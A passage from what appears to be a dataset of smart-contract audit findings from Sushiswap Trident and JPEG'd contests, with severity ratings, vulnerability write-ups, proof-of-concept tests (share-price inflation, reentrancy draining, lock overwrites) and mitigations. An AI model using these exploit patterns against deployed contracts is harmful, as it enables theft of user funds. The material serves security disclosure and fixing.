Change the `require` logic to `recoveredAddress != address(0) && (recoveredAddress == owner) || isApprovedForAll[owner][recoveredAddress])`."
35.md,ConcentratedLiquidityPoolManager.sol `claimReward()` and `reclaimIncentive()` will fail when `incentive.token` is `token0` or `token1`,medium,"In `ConcentratedLiquidityPosition.collect()`, balances of `token0` and `token1` in bento will be used to pay the fees.

[`ConcentratedLiquidityPosition.sol#L103` L116](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPosition.sol#L103-L116)

```solidity
uint256 balance0 = bento.balanceOf(token0, address(this));
uint256 balance1 = bento.balanceOf(token1, address(this));
if (balance0 < token0amount || balance1 < token1amount) {
    (uint256 amount0fees, uint256 amount1fees) = position.pool.collect(position.lower, position.upper, address(this), false);

    uint256 newBalance0 = amount0fees + balance0;
    uint256 newBalance1 = amount1fees + balance1;

    /// @dev Rounding errors due to frequent claiming of other users in the same position may cost us some raw
    if (token0amount > newBalance0) token0amount = newBalance0;
    if (token1amount > newBalance1) token1amount = newBalance1;
}
_transfer(token0, address(this), recipient, token0amount, unwrapBento);
_transfer(token1, address(this), recipient, token1amount, unwrapBento);

```

In the case of someone add an incentive with `token0` or `token1`, the incentive in the balance of bento will be used to pay fees until the balance is completely consumed.

As a result, when a user calls `claimReward()`, the contract may not have enough balance to pay (it supposed to have it), cause the transaction to fail.

[`ConcentratedLiquidityPoolManager.sol#L78` L100](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPoolManager.sol#L78-L100)
```solidity
function claimReward(
    uint256 positionId,
    uint256 incentiveId,
    address recipient,
    bool unwrapBento
) public {
    require(ownerOf[positionId] == msg.sender, ""OWNER"");
    Position memory position = positions[positionId];
    IConcentratedLiquidityPool pool = position.pool;
    Incentive storage incentive = incentives[position.pool][positionId];
    Stake storage stake = stakes[positionId][incentiveId];
    require(stake.initialized, ""UNINITIALIZED"");
    uint256 secondsPerLiquidityInside = pool.rangeSecondsInside(position.lower, position.upper) - stake.secondsInsideLast;
    uint256 secondsInside = secondsPerLiquidityInside * position.liquidity;
    uint256 maxTime = incentive.endTime < block.timestamp ? block.timestamp : incentive.endTime;
    uint256 secondsUnclaimed = (maxTime - incentive.startTime) << (128 - incentive.secondsClaimed);
    uint256 rewards = (incentive.rewardsUnclaimed * secondsInside) / secondsUnclaimed;
    incentive.rewardsUnclaimed -= rewards;
    incentive.secondsClaimed += uint160(secondsInside);
    stake.secondsInsideLast += uint160(secondsPerLiquidityInside);
    _transfer(incentive.token, address(this), recipient, rewards, unwrapBento);
    emit ClaimReward(positionId, incentiveId, recipient);
}
```
The same issue applies to `reclaimIncentive()` as well.
[`ConcentratedLiquidityPoolManager.sol` L49 L62](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPoolManager.sol#L49-L62)

```solidity
function reclaimIncentive(
    IConcentratedLiquidityPool pool,
    uint256 incentiveId,
    uint256 amount,
    address receiver,
    bool unwrapBento
) public {
    Incentive storage incentive = incentives[pool][incentiveId];
    require(incentive.owner == msg.sender, ""NOT_OWNER"");
    require(incentive.expiry < block.timestamp, ""EXPIRED"");
    require(incentive.rewardsUnclaimed >= amount, ""ALREADY_CLAIMED"");
    _transfer(incentive.token, address(this), receiver, amount, unwrapBento);
    emit ReclaimIncentive(pool, incentiveId);
}
```

#### Recommendation
Consider making adding `token0` or `token1` as incentives disallowed, or keep a record of total remaining incentive amounts for the incentive tokens and avoid consuming these revered balances when `collect()`."
35.md,Incentives for different pools should differ by a large factor,medium,"I'm adding this as an issue because I didn't see it mentioned anywhere in the codebase, and I think its a fair point that relates to how the protocol gives out rewards to users. As I understand , the point of staking is to provide users with additional compensation for providing liquidity (and taking on risk) for the good of the protocol. If a large fraction of rewards go to users who don't provide a huge benefit to the protocol, that's a problem.

Consider two different pools: USDC-DAI and USDC-ETH. Suppose a user has \$10K worth of tokens and decides to provide liquidity to each of these pools.

In the USDC-DAI pool the user can very safely provide the \$10K with a 1% spread between upper and lower tick. The total amount of liquidity he provides is roughly \$10K \* (1/0.01) = \$1 M dollars of liquidity per second. The impermanent loss here is going to be basically 0 in normal conditions. The liquidity will be in range all the time.

The same situation in the USDC-ETH pool on the other hand:
Suppose a user has \$10K worth of USDC+ETH, provides it with a 1% spread between upper and lower ticks at the current price => roughly \$1 M dollars of liquidity per second, the same as before. However, now there is a good chance that price ranges by more than 1% meaning he loses all of his more valuable tokens for the cheaper ones due to impermanent loss. The liquidity will be out of range for a much longer percentage of the time.

However, if the incentives for each pool are the same, the staking protocol would value the liquidity per second of each LP situation equally. To make things ""fair per unit of risk/liquidity"" the incentive on the USDC-ETH should be something like 10x or 20x the incentive on the USDC-DAI pool. The pools with higher volatility should have a *significantly* higher incentive.

Recommendations:
Make sure the developers are at least aware of something like this when choosing incentive amounts for different pools. Carefully choose incentive amounts for each pool."
107.md,yVault: First depositor can break minting of shares,high,"[yVault.sol#L148-L153](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L148-L153)<br>

The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719\_ToB_yearn_vaultsv2/ToB\_-\_Yearn_Vault_v\_2\_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.

### Proof of Concept

*   Attacker deposits 1 wei to mint 1 share
*   Attacker transfers exorbitant amount to the `StrategyPUSDConvex` contract to greatly inflate the share’s price. Note that the strategy deposits its entire balance into Convex when its `deposit()` function is called.
*   Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.

Insert this test into [`yVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/yVault.ts).

```jsx
it.only(""will cause 0 share issuance"", async () => {
  // mint 10k + 1 wei tokens to user1
  // mint 10k tokens to owner
  let depositAmount = units(10_000);
  await token.mint(user1.address, depositAmount.add(1));
  await token.mint(owner.address, depositAmount);
  // token approval to yVault
  await token.connect(user1).approve(yVault.address, 1);
  await token.connect(owner).approve(yVault.address, depositAmount);
  
  // 1. user1 mints 1 wei = 1 share
  await yVault.connect(user1).deposit(1);
  
  // 2. do huge transfer of 10k to strategy
  // to greatly inflate share price (1 share = 10k + 1 wei)
  await token.connect(user1).transfer(strategy.address, depositAmount);
  
  // 3. owner deposits 10k
  await yVault.connect(owner).deposit(depositAmount);
  // receives 0 shares in return
  expect(await yVault.balanceOf(owner.address)).to.equal(0);

  // user1 withdraws both his and owner's deposits
  // total amt: 20k + 1 wei
  await expect(() => yVault.connect(user1).withdrawAll())
    .to.changeTokenBalance(token, user1, depositAmount.mul(2).add(1));
});
```

### Recommended Mitigation Steps

*   [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.
*   Ensure the number of shares to be minted is non-zero: `require(_shares != 0, ""zero shares minted"");`






***"
107.md,"Existing user’s locked JPEG could be overwritten by new user, causing permanent loss of JPEG funds",high,"[NFTVault.sol#L375](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L375)<br>
[JPEGLock.sol#L54-L62](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/lock/JPEGLock.sol#L54-L62)<br>

A user’s JPEG lock schedule can be overwritten by another user’s if he (the other user) submits and finalizes a proposal to change the same NFT index’s value.

The existing user will be unable to withdraw his locked JPEGs, resulting in permanent lock up of JPEG in the locker contract.

### Proof of Concept

1.  `user` successfully proposes and finalizes a proposal to change his NFT’s collateral value
2.  Another user (`owner`) does the same for the same NFT index
3.  `user` will be unable to withdraw his locked JPEG because schedule has been overwritten

Insert this test case into [`NFTVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/NFTVault.ts).

```jsx
it.only(""will overwrite existing user's JPEG lock schedule"", async () => {
  // 0. setup
  const index = 7000;
  await erc721.mint(user.address, index);
  await nftVault
    .connect(dao)
    .setPendingNFTValueETH(index, units(50));
  await jpeg.transfer(user.address, units(150000));
  await jpeg.connect(user).approve(locker.address, units(500000));
  await jpeg.connect(owner).approve(locker.address, units(500000));

  // 1. user has JPEG locked for finalization
  await nftVault.connect(user).finalizePendingNFTValueETH(index);

  // 2. owner submit proposal to further increase NFT value
  await nftVault
    .connect(dao)
    .setPendingNFTValueETH(index, units(100));
  
  // 3. owner finalizes, has JPEG locked
  await nftVault.connect(owner).finalizePendingNFTValueETH(index);

  // user schedule has been overwritten
  let schedule = await locker.positions(index);
  expect(schedule.owner).to.equal(owner.address);

  // user tries to unstake
  // wont be able to because schedule was overwritten
  await timeTravel(days(366));
  await expect(locker.connect(user).unlock(index)).to.be.revertedWith(""unauthorized"");
});
```

### Recommended Mitigation Steps

1.  Release the tokens of the existing schedule. Simple and elegant.

```jsx
// in JPEGLock#lockFor()
LockPosition memory existingPosition = positions[_nftIndex];
if (existingPosition.owner != address(0)) {
  // release jpegs to existing owner
  jpeg.safeTransfer(existingPosition.owner, existingPosition.lockAmount);
}
```

2.  Revert in `finalizePendingNFTValueETH()` there is an existing lock schedule. This is less desirable IMO, as there is a use-case for increasing / decreasing the NFT value.






***"
107.md,Update initializer modifier to prevent reentrancy during initialization,high,"[package.json#L18-L19](https://github.com/code-423n4/2022-04-jpegd/blob/main/package.json#L18-L19)<br>

The solution uses:

```jsx
    ""@openzeppelin/contracts"": ""^4.0.0"",
    ""@openzeppelin/contracts-upgradeable"": ""^4.3.2"",
```

These dependencies have a known high severity vulnerability:

*   <https://security.snyk.io/vuln/SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177>
*   <https://snyk.io/test/npm/@openzeppelin/contracts-upgradeable/4.3.2#SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177>
*   <https://snyk.io/test/npm/@openzeppelin/contracts/4.0.0#SNYK-JS-OPENZEPPELINCONTRACTS-2320176>

Which makes these contracts vulnerable:

```jsx
contracts/helpers/CryptoPunksHelper.sol:
  19:     function initialize(address punksAddress) external initializer {

contracts/helpers/EtherRocksHelper.sol:
  19:     function initialize(address rocksAddress) external initializer {

contracts/staking/JPEGStaking.sol:
  21:     function initialize(IERC20Upgradeable _jpeg) external initializer {

contracts/vaults/FungibleAssetVaultForDAO.sol:
  71:     ) external initializer {

contracts/vaults/NFTVault.sol:
  149:     ) external initializer {
```

### Recommended Mitigation Steps

Upgrade `@openzeppelin/contracts` and `@openzeppelin/contracts-upgradeable` to version 4.4.1 or higher.






***"
107.md,Reentrancy issue in `yVault.deposit`,high,"[yVault.sol#L144-L145](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L144-L145)<br>

In `deposit`, the balance is cached and then a `token.transferFrom` is triggered which can lead to exploits if the `token` is a token that gives control to the sender, like ERC777 tokens.

### Proof of Concept

Initial state: `balance() = 1000`, shares `supply = 1000`.
Depositing 1000 amount should mint 1000 supply, but one can split the 1000 amounts into two 500 deposits and use re-entrancy to profit.

*   Outer `deposit(500)`: `balanceBefore = 1000`. Control is given to attacker ...
*   Inner `deposit(500)`: `balanceBefore = 1000`. `shares = (_amount * supply) / balanceBefore = 500 * 1000 / 1000 = 500` shares are minted ...
*   Outer `deposit(500)` continues with the mint: `shares = (_amount * supply) / balanceBefore = 500 * 1500 / 1000 = 750` are minted.
*   Withdrawing the `500 + 750 = 1250` shares via `withdraw(1250)`, the attacker receives `backingTokens = (balance() * _shares) / supply = 2000 * 1250 / 2250 = 1111.111111111`. The attacker makes a profit of `1111 - 1000 = 111` tokens.
*   They repeat the attack until the vault is drained.

### Recommended Mitigation Steps

The `safeTransferFrom` should be the last call in `deposit`.






***"
107.md,`yVaultLPFarming`: No guarantee JPEG currentBalance > previousBalance,high,"[yVaultLPFarming.sol#L169-L170](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L169-L170)<br>

yVault users participating in the farm have to trust that:

*   `vault.balanceOfJPEG()`  returns the correct claimable JPEG amount by its strategy / strategies
*   the strategy / strategies will send all claimable JPEG to the farm

Should either of these assumptions break, then it could possibly be the case that `currentBalance` is less than `previousBalance`, causing deposits and crucially, withdrawals to fail due to subtraction overflow.

### Proof of Concept

For instance,

*   Farm migration occurs. A new farm is set in `yVault`, then `withdrawJPEG()` is called, which sends funds to the new farm. Users of the old farm would be unable to withdraw their deposits.

```jsx
it.only(""will revert old farms' deposits and withdrawals if yVault migrates farm"", async () => {
  // 0. setup
  await token.mint(owner.address, units(1000));
  await token.approve(yVault.address, units(1000));
  await yVault.depositAll();
  await yVault.approve(lpFarming.address, units(1000));
  // send some JPEG to strategy prior to deposit
  await jpeg.mint(strategy.address, units(100));
  // deposit twice, so that the second deposit will invoke _update()
  await lpFarming.deposit(units(250));
  await lpFarming.deposit(units(250));
	
  // 1. change farm and call withdrawJPEG()
  await yVault.setFarmingPool(user1.address);
  await yVault.withdrawJPEG();
	
  // deposit and withdrawal will fail
  await expect(lpFarming.deposit(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');
  await expect(lpFarming.withdraw(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');
});
```

*   Strategy migration occurs, but JPEG funds held by the old strategy were not claimed, causing `vault.balanceOfJPEG()` to report a smaller amount than previously recorded
*   `jpeg` could be accidentally included in the StrategyConfig, resulting in JPEG being converted to other assets
*   A future implementation takes a fee on the `jpeg` to be claimed

### Recommended Mitigation Steps

A simple fix would be to `return` if `currentBalance ≤ previousBalance`. A full fix would properly handle potential shortfall.

```jsx
if (currentBalance <= previousBalance) return;
```






***"
107.md,Setting new controller can break `YVaultLPFarming`,high,"[yVaultLPFarming.sol#L170](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170)<br>
[yVault.sol#L108](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L108)<br>

The accruals in `yVaultLPFarming` will fail if [`currentBalance < previousBalance`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170) in `_computeUpdate`.

```solidity
currentBalance = vault.balanceOfJPEG() + jpeg.balanceOf(address(this));
uint256 newRewards = currentBalance - previousBalance;
```

No funds can be withdrawn anymore as the `withdraw` functions first trigger an `_update`.

The `currentBalance < previousBalance` case can, for example, be triggerd by decreasing the `vault.balanceOfJPEG()` due to calling `yVault.setController`:

```solidity
function setController(address _controller) public onlyOwner {
    // @audit can reduce balanceofJpeg which breaks other masterchef contract
    require(_controller != address(0), ""INVALID_CONTROLLER"");
    controller = IController(_controller);
}

function balanceOfJPEG() external view returns (uint256) {
    // @audit new controller could return a smaller balance
    return controller.balanceOfJPEG(address(token));
}
```

### Recommended Mitigation Steps

Setting a new controller on a vault must be done very carefully and requires a migration.






***"
107.md,Controller: Strategy migration will fail,high,"[Controller.sol#L95](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/Controller.sol#L95)<br>
[StrategyPUSDConvex.sol#L266](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L266)<br>

The controller calls the `withdraw()` method to withdraw JPEGs from the contract, but the strategy might blacklist the JPEG asset, which is what the PUSDConvex strategy has done.

The migration would therefore revert.

### Proof of Concept

Insert this test into [`StrategyPUSDConvex.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/StrategyPUSDConvex.ts).

```jsx
it.only(""will revert when attempting to migrate strategy"", async () => {
  await controller.setVault(want.address, yVault.address);
  await expect(controller.setStrategy(want.address, strategy.address)).to.be.revertedWith(""jpeg"");
});
```

### Recommended Mitigation Steps

Replace `_current.withdraw(address(jpeg));` with `_current.withdrawJPEG(vaults[_token])`.





***"
107.md,"`StrategyPUSDConvex.balanceOfJPEG` uses incorrect function signature while calling `extraReward.earned`, causing the function to unexpectedly revert everytime",high,"[StrategyPUSDConvex.sol#L234](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L234)<br>

As specified in Convex [BaseRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L149) and [VirtualRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/VirtualBalanceRewardPool.sol#L127), the function signature of `earned` is `earned(address)`. However, `balanceOfJPEG` did not pass any arguments to `earned`, which would cause `balanceOfJPEG` to always revert.

This bug will propagate through `Controller` and `YVault` until finally reaching the source of the call in `YVaultLPFarming ._computeUpdate`, and render the entire farming contract unuseable.

### Proof of Concept

Both `BaseRewardPool.earned` and `VirtualBalanceRewardPool.earned` takes an address as argument

        function earned(address account) public view returns (uint256) {
            return
                balanceOf(account)
                    .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))
                    .div(1e18)
                    .add(rewards[account]);
        }

        function earned(address account) public view returns (uint256) {
            return
                balanceOf(account)
                    .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))
                    .div(1e18)
                    .add(rewards[account]);
        }

But `balanceOfJPEG` does not pass any address to `extraReward.earned`, causing the entire function to revert when called

        function balanceOfJPEG() external view returns (uint256) {
            uint256 availableBalance = jpeg.balanceOf(address(this));

            IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;
            uint256 length = baseRewardPool.extraRewardsLength();
            for (uint256 i = 0; i < length; i++) {
                IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));
                if (address(jpeg) == extraReward.rewardToken()) {
                    availableBalance += extraReward.earned();
                    //we found jpeg, no need to continue the loop
                    break;
                }
            }

            return availableBalance;
        }

### Tools Used

vim, ganache-cli

### Recommended Mitigation Steps

Pass `address(this)` as argument of `earned`.

Notice how we modify the fetching of reward. This is reported in a separate bug report, but for completeness, the entire fix is shown in both report entries.

        function balanceOfJPEG() external view returns (uint256) {
            uint256 availableBalance = jpeg.balanceOf(address(this));

            IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;
            availableBalance += baseRewardPool.earned(address(this));
            uint256 length = baseRewardPool.extraRewardsLength();
            for (uint256 i = 0; i < length; i++) {
                IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));
                if (address(jpeg) == extraReward.rewardToken()) {
                    availableBalance += extraReward.earned(address(this));
                }
            }

            return availableBalance;
        }







***"
107.md,Bad debts should not continue to accrue interest,high,"[NFTVault.sol#L844-L851](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L844-L851)<br>

```solidity
uint256 debtAmount = _getDebtAmount(_nftIndex);
require(
    debtAmount >= _getLiquidationLimit(_nftIndex),
    ""position_not_liquidatable""
);

// burn all payment
stablecoin.burnFrom(msg.sender, debtAmount);
```

In the current design/implementation, the liquidator must fully repay the user's outstanding debt in order to get the NFT.

When the market value of the NFT fell rapidly, the liquidators may not be able to successfully liquidate as they can not sell the NFT for more than the debt amount.

In that case, the protocol will have positions that are considered bad debts.

However, these loans, which may never be repaid, are still accruing interest. And every time the DAO collects interest, new `stablecoin` will be minted.

When the proportion of bad debts is large enough since the interest generated by these bad debts is not backed. It will damage the authenticity of the stablecoin.

### Proof of Concept

Given:

*   `NFT 1` worth 30,000 USD
*   `creditLimitRate` = 60%
*   `liquidationLimitRate` = 50%
*   `debtInterestApr` = 10%

1.  Alice borrowed `10,000 USD` with `NFT #1`;
2.  After 1 year, `NFT 1`'s market value in USD has suddenly dropped to `10,000` USD, no liquidator is willing to repay 11,000 USD for `NFT #1`;
3.  The DAO `collect()` and minted `1,000` stablecoin;
4.  After 1 year, the DAO call `collect()` will mint `1,100` stablecoin. and so on...

### Recommended Mitigation Steps

Consider adding a stored value to record the amount of bad debt, and add a public function that allows anyone to mark a bad debt to get some reward. and change `accrue` to:

```solidity
uint256 internal badDebtPortion;

function accrue() public {
    uint256 additionalInterest = _calculateAdditionalInterest();

    totalDebtAccruedAt = block.timestamp;

    totalDebtAmount += additionalInterest;

    uint256 collectibleInterest = additionalInterest * (totalDebtPortion - badDebtPortion) / totalDebtPortion;
    totalFeeCollected += collectibleInterest;
}
```






***"
107.md,"When _lpToken is jpeg, reward calculation is incorrect",medium,"In the LPFarming contract, a new staking pool can be added using the add() function. The staking token for the new pool is defined using the \_lpToken variable. However, there is no additional checking whether the \_lpToken is the same as the reward token (jpeg) or not.

        function add(uint256 _allocPoint, IERC20 _lpToken) external onlyOwner {
            _massUpdatePools();

            uint256 lastRewardBlock = _blockNumber();
            totalAllocPoint = totalAllocPoint + _allocPoint;
            poolInfo.push(
                PoolInfo({
                    lpToken: _lpToken,
                    allocPoint: _allocPoint,
                    lastRewardBlock: lastRewardBlock,
                    accRewardPerShare: 0
                })
            );
        }

When the \_lpToken is the same token as jpeg, reward calculation for that pool in the updatePool() function can be incorrect. This is because the current balance of the \_lpToken in the contract is used in the calculation of the reward. Since the \_lpToken is the same token as the reward, the reward minted to the contract will inflate the value of lpSupply, causing the reward of that pool to be less than what it should be.

        function _updatePool(uint256 _pid) internal {
            PoolInfo storage pool = poolInfo[_pid];
            if (pool.allocPoint == 0) {
                return;
            }

            uint256 blockNumber = _blockNumber();
            //normalizing the pool's `lastRewardBlock` ensures that no rewards are distributed by staking outside of an epoch
            uint256 lastRewardBlock = _normalizeBlockNumber(pool.lastRewardBlock);
            if (blockNumber <= lastRewardBlock) {
                return;
            }
            uint256 lpSupply = pool.lpToken.balanceOf(address(this));
            if (lpSupply == 0) {
                pool.lastRewardBlock = blockNumber;
                return;
            }
            uint256 reward = ((blockNumber - lastRewardBlock) *
                epoch.rewardPerBlock *
                1e36 *
                pool.allocPoint) / totalAllocPoint;
            pool.accRewardPerShare = pool.accRewardPerShare + reward / lpSupply;
            pool.lastRewardBlock = blockNumber;
        }

### Proof of Concept

[LPFarming.sol#L141-L154](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L141-L154)<br>
[LPFarming.sol#L288-L311](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L288-L311)<br>

### Recommended Mitigation Steps

Add a check that \_lpToken is not jpeg in the add function or mint the reward token to another contract to prevent the amount of the staked token from being mixed up with the reward token.






***"
107.md,NFTHelper Contract Allows Owner to Burn NFTs,medium,"[CryptoPunksHelper.sol#L38](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L38)<br>
[CryptoPunksHelper.sol#L52](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L52)<br>

In the NFT helper contract, there is no validation on that the receiver address must not be address zero. Therefore, it allows owner or an attacker who gain access to the owner address to burn NFTs forever through the functions by transferring the NFTs to address zero.

### Proof of Concept

The PoC is originally conducted using foundry. However, it isn't that complicated so I rewrote it in TypeScipt as well, the team can easily proof this by including in the `CryptoPunksHelper.ts`.

#### TypeScript

    // add `.only` to run only this test, not all.
    it.only(""allows the owner to burn nfts"", async () => {
        // safeTransferFrom
        await cryptoPunks.getPunk(1);
        await cryptoPunks.transferPunk(helper.address, 1);
        await helper.safeTransferFrom(owner.address, ZERO_ADDRESS, 1);
        expect(await cryptoPunks.punkIndexToAddress(1)).to.equal(ZERO_ADDRESS);
        expect(await helper.ownerOf(1)).to.equal(ZERO_ADDRESS);

        // transferFrom
        await cryptoPunks.getPunk(2);
        await cryptoPunks.transferPunk(helper.address, 2);
        await helper.transferFrom(owner.address, ZERO_ADDRESS, 2);
        expect(await cryptoPunks.punkIndexToAddress(2)).to.equal(ZERO_ADDRESS);
        expect(await helper.ownerOf(2)).to.equal(ZERO_ADDRESS);
      });

#### Foundry

    pragma solidity ^0.8.0;

    // for test
    import ""ds-test/test.sol"";
    import ""forge-std/Vm.sol"";

    // contracts
    import ""../test/CryptoPunks.sol"";
    import ""../helpers/CryptoPunksHelper.sol"";

    contract CryptoPunksHelperTest is DSTest {
        Vm constant vm = Vm(HEVM_ADDRESS);
        
        address owner = address(1);
        address user = address(2);
        
        CryptoPunks private cps;
        CryptoPunksHelper private helper;

        function setUp() public {
            vm.startPrank(owner);
            cps = new CryptoPunks();
            helper = new CryptoPunksHelper();
            helper.initialize(address(cps));
            vm.stopPrank();
        }

        function testOwnerTransferToZero() public {
            //make sure address zero hold no punks
            assertEq(cps.balanceOf(address(0)), 0);

            // safeTransferFrom PoC
            vm.startPrank(owner);
            cps.getPunk(1);
            cps.transferPunk(address(helper), 1);
            helper.safeTransferFrom(owner, address(0), 1);
            assertEq(cps.punkIndexToAddress(1), address(0));
            assertEq(helper.ownerOf(1), address(0));
            assertEq(cps.balanceOf(address(0)), 1);

            // transferFrom PoC
            cps.getPunk(2);
            cps.transferPunk(address(helper), 2);
            helper.transferFrom(owner, address(0), 2);
            assertEq(cps.punkIndexToAddress(2), address(0));
            assertEq(helper.ownerOf(2), address(0));
            assertEq(cps.balanceOf(address(0)), 2);
        }
    }

foundry.toml

    [default]
    src = ""contracts""
    libs = [""lib/forge-std/lib"", ""lib/"", ""node_modules""]
    solc_version = ""0.8.0""
    optimizer = false
    fuzz_runs = 100000
    test = ""foundryTest""

### Tools Used

*   Foundry
*   Hardhat

### Recommended Mitigation Steps

Even the functions are restricted for only the owner, the zero address should not be allowed as the receiver address.




***"
107.md,reward will be locked in the farm if no LP join the pool at epoch.startBlock,medium,"[LPFarming.sol#L214](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L214)<br>
[LPFarming.sol#L107](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L107)<br>

A part of reward tokens will be locked in the farming pool if no user deposits lpToken at the epoch.startBlock.

### Proof of Concept

    it(""a part of reward should be locked in farm if no LP join the pool at epoch.startBlock"", async() => {
          // manual mine new block  
          await network.provider.send(""evm_setAutomine"", [false]);

          // prepare 
          await lpTokens[0].transfer(alice.address, units(1000));
          await lpTokens[0].connect(alice).approve(farming.address, units(1000));
          await mineBlocks(1);

          // create new pool
          await farming.add(10, lpTokens[0].address);
          await mineBlocks(1);
          expect(await farming.poolLength()).to.equal(1);

          let pool = await farming.poolInfo(0);
          expect(pool.lpToken).to.equal(lpTokens[0].address);
          expect(pool.allocPoint).to.equal(10);

          // create new epoch ==> balance of pool will be 1000 
          let blockNumber = await ethers.provider.getBlockNumber();
          await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);

          // skip the epoch.startBlock  
          // it mean no one deposit lpToken to farm at this block 
          await mineBlocks(1);
          expect(await jpeg.balanceOf(farming.address)).to.equal(1000);

          // alice deposit 
          await farming.connect(alice).deposit(0, units(100));
          await mineBlocks(1);

          // skip the blocks to the end of epoch 
          await mineBlocks(13);

          await farming.connect(alice).claim(0);
          await mineBlocks(1);

          console.log(""reward of alice: "", (await jpeg.balanceOf(alice.address)).toString());
          console.log(""reward remain: "", await jpeg.balanceOf(farming.address));

          // 100 jpeg will be locked in the pool forevers 
          expect(await jpeg.balanceOf(alice.address)).to.equal(900);
          expect(await jpeg.balanceOf(farming.address)).to.equal(100);
        }); 

In the example above, I create an epoch from blockNumber + 1 to blockNumber + 11 with the reward for each block being 100JPEG. So, the total reward for this farm will be 1000JPEG. When I skip the epoch.startBlock and let Alice deposit 100 lpToken at the block right after, at the end of the farm (epoch.endBlock), the total reward of Alice is just 900JPEG, and 100JPEG still remains in the farming pool. Since there is no function for the admin (or users) to withdraw the remaining, 100JPEG will be stucked in the pool forever !!!

### Tools Used

typescript

### Recommended Mitigation Steps

Add a new function for the admin (or user) to claim all rewards which remained in the pool when epoch.endTime has passed

    function claimRemainRewardsForOwner() external onlyOwner {
            require(
                block.number > epoch.endBlock, 
                'epoch has not ended'
            );
            uint256 remain = jpeg.balanceOf(address(this));
            jpeg.safeTransfer(msg.sender, remain);
        }





***"
107.md,`setDebtInterestApr` should accrue debt first,medium,"[NFTVault.sol#L212](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L212)<br>

The `setDebtInterestApr` changes the debt interest rate without first accruing the debt.<br>
This means that the new debt interest rate is applied retroactively to the unaccrued period on next `accrue()` call.

It should never be applied retroactively to a previous time window as this is unfair & wrong.<br>
Borrowers can incur more debt than they should.

### Recommended Mitigation Steps

Call `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`.






***"
107.md,Rewards will be locked if user transfer directly to pool without using deposit function,medium,"[LPFarming.sol#L190](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L190)<br>

Reward will be locked in the farming, when user execute a direct transfer with lpToken to farm without using deposit.

### Proof of Concept

""pls add this test to LpFarming.ts to check""

    it(""a part of rewards can't be distributed if user execute a direct transfer to farm"", async() => {
          // manual mine new block  
